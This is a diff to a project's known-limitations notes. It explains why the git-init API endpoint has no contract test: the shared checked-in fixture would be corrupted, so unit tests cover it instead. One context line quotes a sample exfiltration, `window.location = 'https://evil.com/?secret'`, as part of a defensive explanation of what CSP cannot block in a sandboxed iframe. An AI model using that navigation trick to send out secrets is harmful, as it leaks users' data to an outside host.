@@ -110,3 +110,18 @@ requires a manual `kill`/`taskkill`. See
   (`window.location = 'https://evil.com/?secret'`), which is GET-only,
   URL-length-limited, and visually visible to the user; CSP cannot block
   self-navigation of a sandboxed iframe.
+
+## Git init contract test — deferred (harness limitation)
+
+`POST /api/workspaces/{id}/git/init` (S-GIT-INIT) has no black-box contract
+test. The contract harness (`tests/contract_runner/harness.rs`) registers the
+shared checked-in seed workspace (`tests/contract/fixtures/seed-workspace`)
+in-place — no per-test copy. A `git init` POST would create a `.git/` directory
+inside that checked-in fixture, corrupting it for the parallel
+`workspaces_git_ok` / `workspaces_git_status_not_a_repo` /
+`workspaces_git_diff_not_a_repo` cases that depend on `repoDetected: false`.
+
+The endpoint is covered by unit tests in `src/git/mod.rs`
+(`init_refuses_existing_repo`, `init_creates_repo_in_plain_dir`). A contract
+test requires either per-test workspace isolation in the harness or a
+dedicated mutating-test mode; both are out of scope for S-GIT-INIT.
